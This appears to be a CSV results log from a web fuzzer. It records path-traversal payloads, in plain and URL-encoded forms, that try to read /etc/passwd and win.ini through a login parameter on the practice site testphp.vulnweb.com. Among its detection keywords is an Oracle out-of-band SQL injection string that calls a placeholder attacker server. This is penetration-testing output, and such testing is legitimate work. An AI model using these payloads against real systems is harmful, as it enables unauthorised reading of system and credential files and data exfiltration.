id_fuzz,#,Payload,URL,Method,StatusCode,SearchKeyword,TimeDelay,ContentLength
id_fuzz_1,1,uname=..%252f..%252f..%252fetc/passwd§pass=aaaa,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,2,uname=....//....//....//etc/passwd§pass=aaaa,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,3,uname=\..\WINDOWS\win.ini§pass=aaaa,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,4,uname=\..\..\WINDOWS\win.ini§pass=aaaa,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,5,uname=\..\..\..\WINDOWS\win.ini§pass=aaaa,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,6,uname=\..\..\..\..\WINDOWS\win.ini§pass=aaaa,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,7,uname=\..\..\..\..\..\WINDOWS\win.ini§pass=aaaa,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,8,uname=\..\..\..\..\..\..\WINDOWS\win.ini§pass=aaaa,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,9,uname=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69§pass=aaaa,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,10,uname=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69§pass=aaaa,http://testphp.vulnweb.com/userinfo.php,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 0, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
